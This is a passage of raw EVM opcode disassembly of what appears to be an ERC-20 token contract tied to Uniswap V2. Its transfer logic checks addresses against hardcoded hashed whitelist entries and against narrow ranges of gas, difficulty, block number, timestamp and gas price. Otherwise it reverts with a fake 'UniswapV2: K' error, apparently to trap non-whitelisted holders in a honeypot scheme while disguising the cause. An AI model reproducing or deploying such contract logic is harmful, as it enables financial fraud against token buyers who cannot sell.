POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH3 0x455 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1E PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x556E697377617056324C6962726172793A205A45524F5F414444524553530000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH3 0x474 DUP4 DUP4 DUP4 PUSH3 0x493 PUSH1 0x20 SHL PUSH3 0x5A9 OR PUSH1 0x20 SHR JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH3 0x10000 SWAP1 DIV PUSH1 0xFF AND ISZERO PUSH3 0x493 JUMPI PUSH3 0x493 DUP4 DUP4 DUP4 PUSH3 0x4FA JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 ADD DUP4 DUP2 LT ISZERO PUSH3 0x4F3 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1B PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH2 0x140 DUP2 ADD DUP3 MSTORE PUSH31 0x314E565E0574CB412563DF634608D76F5C59D9F817E85966100EC1D48005C0 DUP2 MSTORE PUSH32 0x8A3552D60A98E0ADE765ADDDAD0A2E420CA9B1EEF5F326BA7AB860BB4EA72C94 PUSH1 0x20 DUP3 ADD MSTORE PUSH32 0x1EBAA930B8E9130423C183BF38B0564B0103180B7DAD301013B18E59880541AE SWAP2 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH32 0xF4CA8532861558E29F9858A3804245BB30F0303CC71E4192E41546237B6CE58B PUSH1 0x60 DUP3 ADD MSTORE PUSH32 0xE5C951F74BC89EFA166514AC99D872F6B7A3C11AFF63F51246C3742DFA925C9B PUSH1 0x80 DUP3 ADD MSTORE PUSH32 0x93230D0B2377404A36412E26D231DE4C7E1A9FB62E227B420200EE950A5CA9C0 PUSH1 0xA0 DUP3 ADD MSTORE PUSH32 0xB6711C87F5D70AA0EC9DCBFF648CAB4EDE7AEC7218E4E2FEF065F83253FC9108 PUSH1 0xC0 DUP3 ADD MSTORE PUSH32 0x51494C771C377610540E8B9B86186216A64DCF73A7AB57EC2C5953286F059F60 PUSH1 0xE0 DUP3 ADD MSTORE PUSH32 0x1C06CEFF26C1E104939FABC1D917760E45551281E46ED897561F29A31EF875F3 PUSH2 0x100 DUP3 ADD MSTORE PUSH32 0xD1C9116E78EF547BBF6D308C24C15A19C52A03BDD09355BD1156D9E86AE1E685 PUSH2 0x120 DUP3 ADD MSTORE PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND SWAP2 AND EQ DUP1 ISZERO PUSH3 0x69F JUMPI POP PUSH1 0x0 DUP3 GT JUMPDEST DUP1 ISZERO PUSH3 0x6B4 JUMPI POP PUSH1 0x7 SLOAD PUSH2 0x100 SWAP1 DIV PUSH1 0xFF AND ISZERO JUMPDEST ISZERO PUSH3 0x738 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x60 SHL SUB NOT PUSH1 0x60 DUP7 SWAP1 SHL AND PUSH1 0x20 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP3 MLOAD DUP1 DUP4 SUB PUSH1 0x14 ADD DUP2 MSTORE PUSH1 0x34 SWAP1 SWAP3 ADD SWAP1 SWAP3 MSTORE DUP1 MLOAD SWAP2 ADD KECCAK256 PUSH1 0x0 JUMPDEST PUSH1 0xA DUP2 LT ISZERO PUSH3 0x735 JUMPI DUP2 DUP4 DUP3 PUSH1 0xA DUP2 LT PUSH3 0x708 JUMPI INVALID JUMPDEST PUSH1 0x20 MUL ADD MLOAD EQ ISZERO PUSH3 0x72C JUMPI POP POP PUSH1 0x7 DUP1 SLOAD PUSH2 0xFF00 NOT AND PUSH2 0x100 OR SWAP1 SSTORE POP PUSH3 0x493 JUMP JUMPDEST PUSH1 0x1 ADD PUSH3 0x6F0 JUMP JUMPDEST POP POP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 DUP2 AND SWAP2 AND EQ DUP1 ISZERO PUSH3 0x756 JUMPI POP PUSH1 0x0 DUP3 GT JUMPDEST DUP1 ISZERO PUSH3 0x76A JUMPI POP PUSH1 0x7 SLOAD PUSH2 0x100 SWAP1 DIV PUSH1 0xFF AND JUMPDEST ISZERO PUSH3 0x921 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x60 SHL SUB NOT PUSH1 0x60 DUP8 SWAP1 SHL AND PUSH1 0x20 DUP1 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP3 MLOAD DUP1 DUP4 SUB PUSH1 0x14 ADD DUP2 MSTORE PUSH1 0x34 SWAP1 SWAP3 ADD SWAP1 SWAP3 MSTORE DUP1 MLOAD SWAP2 ADD KECCAK256 PUSH1 0x0 JUMPDEST PUSH1 0xA DUP2 LT ISZERO PUSH3 0x7F9 JUMPI DUP2 DUP4 DUP3 PUSH1 0xA DUP2 LT PUSH3 0x7BE JUMPI INVALID JUMPDEST PUSH1 0x20 MUL ADD MLOAD EQ ISZERO PUSH3 0x7F0 JUMPI DUP4 PUSH8 0x29A2241AF62C0000 EQ ISZERO PUSH3 0x7E7 JUMPI PUSH1 0x7 DUP1 SLOAD PUSH2 0xFF00 NOT AND SWAP1 SSTORE JUMPDEST POP POP POP PUSH3 0x493 JUMP JUMPDEST PUSH1 0x1 ADD PUSH3 0x7A6 JUMP JUMPDEST POP CHAINID PUSH3 0xF42400 GASLIMIT LT ISZERO DUP1 PUSH3 0x811 JUMPI POP PUSH3 0x895440 GASLIMIT GT ISZERO JUMPDEST DUP1 PUSH3 0x820 JUMPI POP PUSH3 0xF42400 GAS LT ISZERO JUMPDEST DUP1 PUSH3 0x82C JUMPI POP GASLIMIT GAS LT ISZERO JUMPDEST DUP1 PUSH3 0x83E JUMPI POP PUSH7 0xBBC1793248CBD DIFFICULTY LT JUMPDEST DUP1 PUSH3 0x850 JUMPI POP PUSH7 0x2EF05E4C9232F6 DIFFICULTY GT JUMPDEST DUP1 PUSH3 0x85A JUMPI POP ORIGIN ISZERO JUMPDEST DUP1 PUSH3 0x869 JUMPI POP PUSH3 0xC65D40 NUMBER LT ISZERO JUMPDEST DUP1 PUSH3 0x878 JUMPI POP PUSH3 0xBA8E0D NUMBER GT ISZERO JUMPDEST DUP1 PUSH3 0x887 JUMPI POP PUSH4 0x6255AC33 TIMESTAMP GT JUMPDEST DUP1 PUSH3 0x896 JUMPI POP PUSH4 0x607478CB TIMESTAMP LT JUMPDEST DUP1 PUSH3 0x8AA JUMPI POP PUSH8 0x8AC7230489E80000 GASPRICE LT ISZERO JUMPDEST DUP1 PUSH3 0x8B7 JUMPI POP DUP1 PUSH1 0x1 EQ ISZERO JUMPDEST DUP1 PUSH3 0x8DD JUMPI POP PUSH3 0x8C8 PUSH3 0x257 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH3 0x91E JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xC PUSH1 0x24 DUP3 ADD MSTORE PUSH12 0x556E697377617056323A204B PUSH1 0xA0 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP JUMPDEST POP POP POP POP JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH3 0x95F JUMPI PUSH1 0x0 DUP6 SSTORE PUSH3 0x9AA JUMP JUMPDEST DUP3 PUSH1 0x1F LT PUSH3 0x97A JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x9AA JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x9AA JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x9AA JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x98D JUMP JUMPDEST POP PUSH3 0x9B8 SWAP3 SWAP2 POP PUSH3 0x9BC JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x9B8 JUMPI PUSH1 0x0 DUP2 SSTORE PUSH1 0x1 ADD PUSH3 0x9BD JUMP JUMPDEST PUSH2 0x1987 DUP1 PUSH3 0x9E3 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x107 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x10C JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x12A JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x14A JUMPI DUP1 PUSH4 0x1C399F24 EQ PUSH2 0x15F JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x174 JUMPI DUP1 PUSH4 0x30B2BDBB EQ PUSH2 0x187 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x19C JUMPI DUP1 PUSH4 0x338CEC21 EQ PUSH2 0x1B1 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x1B9 JUMPI DUP1 PUSH4 0x42966C68 EQ PUSH2 0x1CC JUMPI DUP1 PUSH4 0x49BFEE57 EQ PUSH2 0x1DF JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x1E7 JUMPI DUP1 PUSH4 0x79CC6790 EQ PUSH2 0x1FA JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x20D JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x215 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x228 JUMPI DUP1 PUSH4 0xC9FA20B6 EQ PUSH2 0x23B JUMPI DUP1 PUSH4 0xCC42C111 EQ PUSH2 0x24E JUMPI DUP1 PUSH4 0xDB14F52A EQ PUSH2 0x256 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x25E JUMPI DUP1 PUSH4 0xE960DBF3 EQ PUSH2 0x271 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x114 PUSH2 0x279 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x121 SWAP2 SWAP1 PUSH2 0x1667 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x13D PUSH2 0x138 CALLDATASIZE PUSH1 0x4 PUSH2 0x15F1 JUMP JUMPDEST PUSH2 0x30F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x121 SWAP2 SWAP1 PUSH2 0x165C JUMP JUMPDEST PUSH2 0x152 PUSH2 0x32C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x121 SWAP2 SWAP1 PUSH2 0x16BA JUMP JUMPDEST PUSH2 0x172 PUSH2 0x16D CALLDATASIZE PUSH1 0x4 PUSH2 0x155D JUMP JUMPDEST PUSH2 0x332 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x13D PUSH2 0x182 CALLDATASIZE PUSH1 0x4 PUSH2 0x15B1 JUMP JUMPDEST PUSH2 0x41F JUMP JUMPDEST PUSH2 0x18F PUSH2 0x4A7 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x121 SWAP2 SWAP1 PUSH2 0x1648 JUMP JUMPDEST PUSH2 0x1A4 PUSH2 0x4B6 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x121 SWAP2 SWAP1 PUSH2 0x16C3 JUMP JUMPDEST PUSH2 0x13D PUSH2 0x4BF JUMP JUMPDEST PUSH2 0x13D PUSH2 0x1C7 CALLDATASIZE PUSH1 0x4 PUSH2 0x15F1 JUMP JUMPDEST PUSH2 0x4CE JUMP JUMPDEST PUSH2 0x172 PUSH2 0x1DA CALLDATASIZE PUSH1 0x4 PUSH2 0x1630 JUMP JUMPDEST PUSH2 0x51C JUMP JUMPDEST PUSH2 0x13D PUSH2 0x530 JUMP JUMPDEST PUSH2 0x152 PUSH2 0x1F5 CALLDATASIZE PUSH1 0x4 PUSH2 0x155D JUMP JUMPDEST PUSH2 0x53E JUMP JUMPDEST PUSH2 0x172 PUSH2 0x208 CALLDATASIZE PUSH1 0x4 PUSH2 0x15F1 JUMP JUMPDEST PUSH2 0x559 JUMP JUMPDEST PUSH2 0x114 PUSH2 0x5AE JUMP JUMPDEST PUSH2 0x13D PUSH2 0x223 CALLDATASIZE PUSH1 0x4 PUSH2 0x15F1 JUMP JUMPDEST PUSH2 0x60F JUMP JUMPDEST PUSH2 0x13D PUSH2 0x236 CALLDATASIZE PUSH1 0x4 PUSH2 0x15F1 JUMP JUMPDEST PUSH2 0x677 JUMP JUMPDEST PUSH2 0x172 PUSH2 0x249 CALLDATASIZE PUSH1 0x4 PUSH2 0x161C JUMP JUMPDEST PUSH2 0x68B JUMP JUMPDEST PUSH2 0x172 PUSH2 0x6FD JUMP JUMPDEST PUSH2 0x172 PUSH2 0x793 JUMP JUMPDEST PUSH2 0x152 PUSH2 0x26C CALLDATASIZE PUSH1 0x4 PUSH2 0x1579 JUMP JUMPDEST PUSH2 0x7FF JUMP JUMPDEST PUSH2 0x18F PUSH2 0x82A JUMP JUMPDEST PUSH1 0x5 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 PUSH1 0x1F PUSH1 0x2 PUSH1 0x0 NOT PUSH2 0x100 PUSH1 0x1 DUP9 AND ISZERO MUL ADD SWAP1 SWAP6 AND SWAP5 SWAP1 SWAP5 DIV SWAP4 DUP5 ADD DUP2 SWAP1 DIV DUP2 MUL DUP3 ADD DUP2 ADD SWAP1 SWAP3 MSTORE DUP3 DUP2 MSTORE PUSH1 0x60 SWAP4 SWAP1 SWAP3 SWAP1 SWAP2 DUP4 ADD DUP3 DUP3 DUP1 ISZERO PUSH2 0x305 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2DA JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x305 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x2E8 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x323 PUSH2 0x31C PUSH2 0x94C JUMP JUMPDEST DUP5 DUP5 PUSH2 0x950 JUMP JUMPDEST POP PUSH1 0x1 SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x4 SLOAD SWAP1 JUMP JUMPDEST PUSH2 0x33A PUSH2 0x94C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x34B PUSH2 0x82A JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ PUSH2 0x390 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x17BF PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND PUSH2 0x3D5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x2A DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x18D9 PUSH1 0x2A SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND SWAP3 AND SWAP1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x182F DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 PUSH1 0x0 SWAP1 LOG3 PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE JUMP JUMPDEST PUSH1 0x0 PUSH2 0x42C DUP5 DUP5 DUP5 PUSH2 0xA3C JUMP JUMPDEST PUSH2 0x49C DUP5 PUSH2 0x438 PUSH2 0x94C JUMP JUMPDEST PUSH2 0x497 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x17E3 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP11 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SWAP1 PUSH2 0x476 PUSH2 0x94C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE PUSH1 0x20 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x40 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP2 SWAP1 PUSH2 0xB8D JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0xFF AND SWAP1 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH3 0x10000 SWAP1 DIV PUSH1 0xFF AND SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x323 PUSH2 0x4DB PUSH2 0x94C JUMP JUMPDEST DUP5 PUSH2 0x497 DUP6 PUSH1 0x3 PUSH1 0x0 PUSH2 0x4EC PUSH2 0x94C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND DUP3 MSTORE PUSH1 0x20 DUP1 DUP4 ADD SWAP4 SWAP1 SWAP4 MSTORE PUSH1 0x40 SWAP2 DUP3 ADD PUSH1 0x0 SWAP1 DUP2 KECCAK256 SWAP2 DUP13 AND DUP2 MSTORE SWAP3 MSTORE SWAP1 KECCAK256 SLOAD SWAP1 PUSH2 0x8F4 JUMP JUMPDEST PUSH2 0x52D PUSH2 0x527 PUSH2 0x94C JUMP JUMPDEST DUP3 PUSH2 0xC24 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH2 0x100 SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x58B DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x180B PUSH1 0x24 SWAP2 CODECOPY PUSH2 0x584 DUP7 PUSH2 0x26C PUSH2 0x94C JUMP JUMPDEST SWAP2 SWAP1 PUSH2 0xB8D JUMP JUMPDEST SWAP1 POP PUSH2 0x59F DUP4 PUSH2 0x599 PUSH2 0x94C JUMP JUMPDEST DUP4 PUSH2 0x950 JUMP JUMPDEST PUSH2 0x5A9 DUP4 DUP4 PUSH2 0xC24 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x6 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 PUSH1 0x1F PUSH1 0x2 PUSH1 0x0 NOT PUSH2 0x100 PUSH1 0x1 DUP9 AND ISZERO MUL ADD SWAP1 SWAP6 AND SWAP5 SWAP1 SWAP5 DIV SWAP4 DUP5 ADD DUP2 SWAP1 DIV DUP2 MUL DUP3 ADD DUP2 ADD SWAP1 SWAP3 MSTORE DUP3 DUP2 MSTORE PUSH1 0x60 SWAP4 SWAP1 SWAP3 SWAP1 SWAP2 DUP4 ADD DUP3 DUP3 DUP1 ISZERO PUSH2 0x305 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2DA JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x305 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x323 PUSH2 0x61C PUSH2 0x94C JUMP JUMPDEST DUP5 PUSH2 0x497 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x192D PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x3 PUSH1 0x0 PUSH2 0x646 PUSH2 0x94C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND DUP3 MSTORE PUSH1 0x20 DUP1 DUP4 ADD SWAP4 SWAP1 SWAP4 MSTORE PUSH1 0x40 SWAP2 DUP3 ADD PUSH1 0x0 SWAP1 DUP2 KECCAK256 SWAP2 DUP14 AND DUP2 MSTORE SWAP3 MSTORE SWAP1 KECCAK256 SLOAD SWAP2 SWAP1 PUSH2 0xB8D JUMP JUMPDEST PUSH1 0x0 PUSH2 0x323 PUSH2 0x684 PUSH2 0x94C JUMP JUMPDEST DUP5 DUP5 PUSH2 0xA3C JUMP JUMPDEST PUSH2 0x693 PUSH2 0x94C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x6A4 PUSH2 0x82A JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ PUSH2 0x6E9 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x17BF PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x5A9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND DUP4 DUP4 PUSH2 0xD0E JUMP JUMPDEST PUSH2 0x705 PUSH2 0x94C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x716 PUSH2 0x82A JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ PUSH2 0x75B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x17BF PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x182F DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP1 DUP4 SWAP1 LOG3 PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND SWAP1 SSTORE JUMP JUMPDEST PUSH2 0x79B PUSH2 0x94C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x7AC PUSH2 0x82A JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ PUSH2 0x7F1 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x17BF PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x7 DUP1 SLOAD PUSH3 0xFF0000 NOT AND SWAP1 SSTORE JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x848 DUP6 DUP6 PUSH2 0xD60 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x60 SHL SUB NOT PUSH1 0x60 SWAP5 DUP6 SHL DUP2 AND PUSH1 0x20 DUP1 DUP5 ADD SWAP2 SWAP1 SWAP2 MSTORE SWAP4 DUP6 SHL DUP2 AND PUSH1 0x34 DUP4 ADD MSTORE DUP3 MLOAD PUSH1 0x28 DUP2 DUP5 SUB ADD DUP2 MSTORE PUSH1 0x48 DUP4 ADD DUP5 MSTORE DUP1 MLOAD SWAP1 DUP6 ADD KECCAK256 PUSH1 0x1 PUSH1 0x1 PUSH1 0xF8 SHL SUB NOT PUSH1 0x68 DUP5 ADD MSTORE SWAP11 SWAP1 SWAP5 SHL SWAP1 SWAP4 AND PUSH1 0x69 DUP5 ADD MSTORE PUSH1 0x7D DUP4 ADD SWAP9 SWAP1 SWAP9 MSTORE PUSH32 0x96E8AC4277198FF8B6F785478AA9A39F403CB768DD02CBEE326C3E7DA348845F PUSH1 0x9D DUP1 DUP5 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP9 MLOAD DUP1 DUP5 SUB SWAP1 SWAP2 ADD DUP2 MSTORE 